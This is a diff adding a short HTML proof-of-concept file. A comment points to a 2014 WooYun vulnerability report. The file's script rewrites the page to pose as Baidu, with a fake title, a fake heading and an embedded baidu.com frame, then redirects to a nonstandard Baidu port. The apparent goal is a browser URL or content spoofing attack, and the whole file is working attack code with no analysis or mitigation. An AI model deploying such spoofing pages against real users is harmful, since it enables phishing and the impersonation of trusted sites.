@@ -1,0 +1,12 @@
+<!--
+vai http://www.wooyun.org/bugs/wooyun-2014-065632 
+-->
+<script>
+function spoof()
+{
+document.write("<title>Baidu</title>");
+document.write("<h1>I'm Fake One</h1><marquee>Attack it!</marquee><iframe src=http://www.baidu.com></iframe>");
+window.location.assign("http://www.baidu.com:8100");
+}
+setInterval(spoof(),2000);
+</script>
